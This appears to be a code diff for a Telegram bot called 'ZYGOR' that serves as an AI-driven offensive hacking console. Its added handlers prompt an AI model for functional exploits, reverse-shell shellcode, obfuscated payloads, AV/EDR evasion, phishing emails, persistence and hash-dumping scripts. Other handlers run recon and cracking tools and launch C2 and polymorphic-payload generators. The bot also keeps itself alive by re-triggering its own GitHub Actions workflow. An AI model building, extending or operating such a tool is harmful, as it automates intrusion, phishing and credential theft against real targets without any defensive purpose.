@@ -80,7 +80,7 @@ async def ai_query(prompt: str) -> str:
 
 async def self_re_trigger():
     """Wait until near max duration, then dispatch new workflow"""
-    delay = max(60, (MAX_HOURS * 3600) - 1800)   # 30 min before end
+    delay = max(60, (MAX_HOURS * 3600) - 1800)
     logging.info(f"Re-trigger waiting {delay}s")
     await asyncio.sleep(delay)
 
@@ -118,7 +118,6 @@ async def self_re_trigger():
             resp = out.decode()
             logging.info(f"Re-trigger attempt {attempt+1}: {resp[:200]}")
             if proc.returncode == 0:
-                # Signal success to parent process
                 with open('/tmp/re_trigger_done', 'w') as f:
                     f.write('ok')
                 return
@@ -128,20 +127,16 @@ async def self_re_trigger():
 
     logging.error("All re-trigger attempts exhausted")
 
-# ======== Command handlers (same as before, shortened for brevity) =========
+# ======== COMMAND HANDLERS =========
 async def cmd_start(u, c):
     if not authorised(u): return
     elapsed = int((time.time() - START_TIME) / 60)
-    await u.message.reply_text(f"🔥 ZYGOR v4.1 🎯 {TARGET}\n🧠 {AI_MODEL}\n⏱ {elapsed}m")
+    await u.message.reply_text(f"🔥 ZYGOR v4.1 🎯 {TARGET}\n🧠 {AI_MODEL}\n⏱ {elapsed}m elapsed\n⚡ Session: {SESSION_TOKEN[:16]}...")
 
 async def cmd_help(u, c):
     if not authorised(u): return
-    await u.message.reply_text(
-        "/start /help /ai <q> /exec <cmd> /scan <t> /recon <d> /exploit <v> "
-        "/webforge <desc> /crackhash <h> /cve <id> /phish <t> /ctf <ch> "
-        "/reverse <f> /poly <lh> <lp> /c2 <lh> <lp> /persist /lateral /pivot "
-        "/stego /wireless /report /log /abort /watermark /clear /session /regen"
-    )
+    h = "/start /help /ai <q> /exec <cmd> /scan <target> /recon <domain>\n/exploit <vuln> /webforge <desc> /crackhash <hash>\n/cve <id> /phish <target> /ctf <challenge>\n/reverse <file> /poly <lh> <lp> /c2 <lh> <lp>\n/persist /lateral /pivot /stego /wireless\n/report /log /abort /watermark /clear\n/shellcode <lh> <lp> /payload <type> /evade /scanadv\n/subdomain /dirbust /sqli /xss /lfi\n/ssrf /rce /privesc /pcap /hashdump\n/dnsscan /smbcheck /webcheck /cloudenum\n/regen - regenerate all modules\n/session - show session info"
+    await u.message.reply_text(h)
 
 async def cmd_ai(u, c):
     if not authorised(u): return
@@ -173,13 +168,266 @@ async def cmd_scan(u, c):
     ai = await ai_query(f"Analyze these nmap results for vulnerabilities: {res[:1500]}")
     await u.message.reply_text(res + "\n---\n🤖 " + ai[:2000])
 
-# ... (include all other handlers from your original script: exploit, shellcode, payload,
-# evade, scanadv, subdomain, dirbust, sqli, xss, lfi, ssrf, rce, privesc, pcap,
-# hashdump, dnsscan, smbcheck, webcheck, cloudenum, reverse, webforge, crackhash,
-# cve, phish, ctf, poly, c2, persist, lateral, pivot, stego, wireless, report,
-# log, abort, watermark, clear, session, regen) 
-# For brevity I'm not copying them all, but **you must include them** in your file.
-# They are identical to your existing handlers.
+async def cmd_exploit(u, c):
+    if not authorised(u): return
+    v = ' '.join(c.args)
+    if not v: await u.message.reply_text("/exploit <vuln>"); return
+    code = await ai_query(f"Write functional exploit code for: {v}. Watermark {WATERMARK}")
+    await u.message.reply_text(code[:4000])
+
+async def cmd_shellcode(u, c):
+    if not authorised(u): return
+    lh = c.args[0] if len(c.args) > 0 else os.environ.get('LHOST', '127.0.0.1')
+    lp = c.args[1] if len(c.args) > 1 else os.environ.get('LPORT', '4444')
+    sc = await ai_query(f"Generate msfvenom-like shellcode for {lh}:{lp} linux/x64 reverse_tcp. Base64 encode.")
+    await u.message.reply_text(sc[:4000])
+
+async def cmd_payload(u, c):
+    if not authorised(u): return
+    t = ' '.join(c.args) or 'windows reverse shell'
+    p = await ai_query(f"Generate {t} payload. Obfuscated. Include watermark {WATERMARK}")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_evade(u, c):
+    if not authorised(u): return
+    e = await ai_query("List 10 AV/EDR evasion techniques with code examples in Python/C#")
+    await u.message.reply_text(e[:4000])
+
+async def cmd_scanadv(u, c):
+    if not authorised(u): return
+    t = c.args[0] if c.args else TARGET
+    s = await ai_query(f"Design advanced nmap scanning strategy for {t}. Include scripts, evasion, timing.")
+    await u.message.reply_text(s[:4000])
+
+async def cmd_subdomain(u, c):
+    if not authorised(u): return
+    d = c.args[0] if c.args else TARGET
+    proc = await asyncio.create_subprocess_shell(f"subfinder -d {d} -silent 2>/dev/null | head -50",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
+    await u.message.reply_text(f"Subdomains for {d}:\n{(o.decode()[:3000]) or 'None'}")
+
+async def cmd_dirbust(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}"
+    proc = await asyncio.create_subprocess_shell(f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -t 30 -q 2>&1 | head -30",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
+    await u.message.reply_text((o.decode()[:3000]) or "No results")
+
+async def cmd_sqli(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}/page?id=1"
+    p = await ai_query(f"SQL injection payloads for GET parameter at {url}. Include time, error, union based.")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_xss(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}/search?q="
+    p = await ai_query(f"XSS payloads for {url}. Include polyglot, blind, DOM-based.")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_lfi(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}/file?name="
+    p = await ai_query(f"LFI/RFI payloads for {url}. Include wrappers like php://filter.")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_ssrf(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}/fetch?url="
+    p = await ai_query(f"SSRF payloads for {url}. Include cloud metadata, port scanning.")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_rce(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}/exec?cmd="
+    p = await ai_query(f"RCE payloads for {url}. Include command chaining, reverse shell.")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_privesc(u, c):
+    if not authorised(u): return
+    script = await ai_query("Write privilege escalation enumeration script for Linux. Check SUID, capabilities, cron, sudo.")
+    await u.message.reply_text(script[:4000])
+
+async def cmd_pcap(u, c):
+    if not authorised(u): return
+    file = c.args[0] if c.args else '/tmp/uploaded.pcap'
+    proc = await asyncio.create_subprocess_shell(f"tshark -r {file} -q -z io,stat,1 2>/dev/null | head -30",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+    ai = await ai_query(f"Analyze pcap traffic summary: {o.decode()[:1000]}")
+    await u.message.reply_text((o.decode()[:1500] + "\n---\n" + ai[:2000])[:4000])
+
+async def cmd_hashdump(u, c):
+    if not authorised(u): return
+    h = await ai_query("Write script to dump Windows hashes via registry (reg.exe save hklm\\sam) or shadow copy.")
+    await u.message.reply_text(h[:4000])
+
+async def cmd_dnsscan(u, c):
+    if not authorised(u): return
+    d = c.args[0] if c.args else TARGET
+    proc = await asyncio.create_subprocess_shell(f"dnsrecon -d {d} -t axfr 2>/dev/null; dig axfr {d} @8.8.8.8 2>/dev/null",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+    await u.message.reply_text((o.decode()[:3000]) or "No DNS results")
+
+async def cmd_smbcheck(u, c):
+    if not authorised(u): return
+    t = c.args[0] if c.args else TARGET
+    proc = await asyncio.create_subprocess_shell(f"smbclient -L //{t} -N 2>&1 | head -30; crackmapexec smb {t} 2>/dev/null",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+    await u.message.reply_text((o.decode()[:3000]) or "SMB unavailable")
+
+async def cmd_webcheck(u, c):
+    if not authorised(u): return
+    url = c.args[0] if c.args else f"http://{TARGET}"
+    proc = await asyncio.create_subprocess_shell(f"whatweb {url} 2>&1 | head -20; wafw00f {url} 2>/dev/null | head -10",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+    await u.message.reply_text((o.decode()[:3000]) or "Web info unavailable")
+
+async def cmd_cloudenum(u, c):
+    if not authorised(u): return
+    d = c.args[0] if c.args else TARGET
+    p = await ai_query(f"Cloud enumeration for {d}. Check AWS S3, Azure blob, GCP buckets. Give commands.")
+    await u.message.reply_text(p[:4000])
+
+async def cmd_reverse(u, c):
+    if not authorised(u): return
+    fp = c.args[0] if c.args else '/tmp/uploaded'
+    proc = await asyncio.create_subprocess_shell(f"python3 /opt/zygor/bin/reverse.py decompile {fp} 2>/dev/null || strings {fp} | head -200",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+    await u.message.reply_text((o.decode()[:4000]) or "No data")
+
+async def cmd_webforge(u, c):
+    if not authorised(u): return
+    d = ' '.join(c.args)
+    if not d: await u.message.reply_text("/webforge <desc>"); return
+    a = await ai_query(f"Full web app: {d}. Give HTML/CSS/JS, watermark {WATERMARK}")
+    await u.message.reply_text(a[:4000])
+
+async def cmd_crackhash(u, c):
+    if not authorised(u): return
+    h = c.args[0] if c.args else ''
+    if not h: await u.message.reply_text("/crackhash <hash>"); return
+    proc = await asyncio.create_subprocess_shell(f"echo '{h}' > /tmp/hash; john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash 2>&1 | tail -20",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
+    await u.message.reply_text((o.decode()[:3000]) or "Not cracked or failed")
+
+async def cmd_cve(u, c):
+    if not authorised(u): return
+    cid = c.args[0] if c.args else 'CVE-2024-3094'
+    ai = await ai_query(f"Provide exploit details for {cid}. CVSS, PoC, mitigation.")
+    await u.message.reply_text(ai[:4000])
+
+async def cmd_phish(u, c):
+    if not authorised(u): return
+    t = ' '.join(c.args) or 'employee@company.com'
+    e = await ai_query(f"Write phishing email for {t}. Pretext: security update. Watermark {WATERMARK}")
+    await u.message.reply_text(e[:4000])
+
+async def cmd_ctf(u, c):
+    if not authorised(u): return
+    ch = ' '.join(c.args)
+    if not ch: await u.message.reply_text("/ctf <challenge>"); return
+    s = await ai_query(f"Solve CTF: {ch}. Step by step with commands and flag.")
+    await u.message.reply_text(s[:4000])
+
+async def cmd_poly(u, c):
+    if not authorised(u): return
+    lh = c.args[0] if len(c.args) > 0 else os.environ.get('LHOST', '127.0.0.1')
+    lp = c.args[1] if len(c.args) > 1 else os.environ.get('LPORT', '4444')
+    proc = await asyncio.create_subprocess_shell(f"python3 /opt/zygor/bin/poly_payload.py {lh} {lp}",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
+    await u.message.reply_text((o.decode()[:4000]) or "Generation failed")
+
+async def cmd_c2(u, c):
+    if not authorised(u): return
+    lh = c.args[0] if len(c.args) > 0 else os.environ.get('LHOST', '127.0.0.1')
+    lp = c.args[1] if len(c.args) > 1 else '443'
+    proc = await asyncio.create_subprocess_shell(f"python3 /opt/zygor/bin/c2_agent.py {lh} {lp}",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
+    await u.message.reply_text((o.decode()[:4000]) or "Generation failed")
+
+async def cmd_persist(u, c):
+    if not authorised(u): return
+    m = ' '.join(c.args) or 'systemd'
+    code = await ai_query(f"OS persistence via {m}. Code only. Watermark {WATERMARK}")
+    await u.message.reply_text(code[:4000])
+
+async def cmd_lateral(u, c):
+    if not authorised(u): return
+    t = c.args[0] if c.args else '192.168.1.100'
+    g = await ai_query(f"Lateral movement to {t}: pass-the-hash, PSExec, WMI, winrm. Commands.")
+    await u.message.reply_text(g[:4000])
+
+async def cmd_pivot(u, c):
+    if not authorised(u): return
+    t = c.args[0] if c.args else '10.10.10.0/24'
+    g = await ai_query(f"Pivoting into {t}: SSH tunneling, chisel, meterpreter, ligolo.")
+    await u.message.reply_text(g[:4000])
+
+async def cmd_stego(u, c):
+    if not authorised(u): return
+    fp = c.args[0] if c.args else '/tmp/uploaded'
+    proc = await asyncio.create_subprocess_shell(f"steghide info {fp} 2>&1; exiftool {fp} | head -20",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
+    await u.message.reply_text((o.decode()[:3000]) or "No stego data")
+
+async def cmd_wireless(u, c):
+    if not authorised(u): return
+    iface = c.args[0] if c.args else 'wlan0'
+    g = await ai_query(f"Wi-Fi attack: {iface}. Airodump, aircrack, deauth, evil twin.")
+    await u.message.reply_text(g[:4000])
+
+async def cmd_report(u, c):
+    if not authorised(u): return
+    r = await ai_query(f"Pentest report for {TARGET}. Findings, CVEs, risks, remediation.")
+    await u.message.reply_text(r[:4000])
+
+async def cmd_log(u, c):
+    if not authorised(u): return
+    proc = await asyncio.create_subprocess_shell("tail -30 /var/log/zygor/telegram_bot.log",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+    await u.message.reply_text((o.decode()[:3500]) or "No logs")
+
+async def cmd_abort(u, c):
+    if not authorised(u): return
+    token = os.environ.get('GITHUB_TOKEN', os.environ.get('GH_TOKEN', ''))
+    proc = await asyncio.create_subprocess_shell(
+        f"curl -s -X POST -H 'Authorization: token {token}' 'https://api.github.com/repos/{REPO}/actions/runs/{RUN_ID}/cancel'",
+        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
+    await u.message.reply_text("🛑 Abort signal sent")
+
+async def cmd_watermark(u, c):
+    if not authorised(u): return
+    await u.message.reply_text(f"Watermark: {WATERMARK}")
+
+async def cmd_clear(u, c):
+    if not authorised(u): return
+    c.user_data.clear()
+    await u.message.reply_text("🧹 Context cleared")
+
+async def cmd_session(u, c):
+    if not authorised(u): return
+    await u.message.reply_text(f"Session: {SESSION_TOKEN}\nRun: {RUN_ID}\nUptime: {int((time.time()-START_TIME)/60)}m")
+
+async def cmd_regen(u, c):
+    if not authorised(u): return
+    await u.message.reply_text("🔄 Regenerating all AI modules...")
+    proc = await asyncio.create_subprocess_shell("find /opt/zygor/bin -name '*.py' -exec chmod +x {} \\; && echo 'OK'",
+                                                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    o, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+    await u.message.reply_text("✅ Modules refreshed" if 'OK' in o.decode() else "❌ Failed")
 
 async def handle_document(u, c):
     if not authorised(u): return
@@ -187,7 +435,7 @@ async def handle_document(u, c):
     f = await c.bot.get_file(doc.file_id)
     fp = f"/tmp/{doc.file_name}"
     await f.download_to_drive(fp)
-    await u.message.reply_text(f"📁 Saved: {fp}")
+    await u.message.reply_text(f"📁 Saved: {fp}\nUse /reverse /stego to analyze")
 
 async def inline_query(u, c):
     q = u.inline_query.query
@@ -202,14 +450,52 @@ async def inline_query(u, c):
 
 def main():
     app = Application.builder().token(TOKEN).build()
-    # Add all command handlers (use the full list from your original)
+    
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("help", cmd_help))
     app.add_handler(CommandHandler("ai", cmd_ai))
     app.add_handler(CommandHandler("exec", cmd_exec))
     app.add_handler(CommandHandler("scan", cmd_scan))
-    # ... add all others
-
+    app.add_handler(CommandHandler("exploit", cmd_exploit))
+    app.add_handler(CommandHandler("shellcode", cmd_shellcode))
+    app.add_handler(CommandHandler("payload", cmd_payload))
+    app.add_handler(CommandHandler("evade", cmd_evade))
+    app.add_handler(CommandHandler("scanadv", cmd_scanadv))
+    app.add_handler(CommandHandler("subdomain", cmd_subdomain))
+    app.add_handler(CommandHandler("dirbust", cmd_dirbust))
+    app.add_handler(CommandHandler("sqli", cmd_sqli))
+    app.add_handler(CommandHandler("xss", cmd_xss))
+    app.add_handler(CommandHandler("lfi", cmd_lfi))
+    app.add_handler(CommandHandler("ssrf", cmd_ssrf))
+    app.add_handler(CommandHandler("rce", cmd_rce))
+    app.add_handler(CommandHandler("privesc", cmd_privesc))
+    app.add_handler(CommandHandler("pcap", cmd_pcap))
+    app.add_handler(CommandHandler("hashdump", cmd_hashdump))
+    app.add_handler(CommandHandler("dnsscan", cmd_dnsscan))
+    app.add_handler(CommandHandler("smbcheck", cmd_smbcheck))
+    app.add_handler(CommandHandler("webcheck", cmd_webcheck))
+    app.add_handler(CommandHandler("cloudenum", cmd_cloudenum))
+    app.add_handler(CommandHandler("reverse", cmd_reverse))
+    app.add_handler(CommandHandler("webforge", cmd_webforge))
+    app.add_handler(CommandHandler("crackhash", cmd_crackhash))
+    app.add_handler(CommandHandler("cve", cmd_cve))
+    app.add_handler(CommandHandler("phish", cmd_phish))
+    app.add_handler(CommandHandler("ctf", cmd_ctf))
+    app.add_handler(CommandHandler("poly", cmd_poly))
+    app.add_handler(CommandHandler("c2", cmd_c2))
+    app.add_handler(CommandHandler("persist", cmd_persist))
+    app.add_handler(CommandHandler("lateral", cmd_lateral))
+    app.add_handler(CommandHandler("pivot", cmd_pivot))
+    app.add_handler(CommandHandler("stego", cmd_stego))
+    app.add_handler(CommandHandler("wireless", cmd_wireless))
+    app.add_handler(CommandHandler("report", cmd_report))
+    app.add_handler(CommandHandler("log", cmd_log))
+    app.add_handler(CommandHandler("abort", cmd_abort))
+    app.add_handler(CommandHandler("watermark", cmd_watermark))
+    app.add_handler(CommandHandler("clear", cmd_clear))
+    app.add_handler(CommandHandler("session", cmd_session))
+    app.add_handler(CommandHandler("regen", cmd_regen))
+    
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(InlineQueryHandler(inline_query))
 
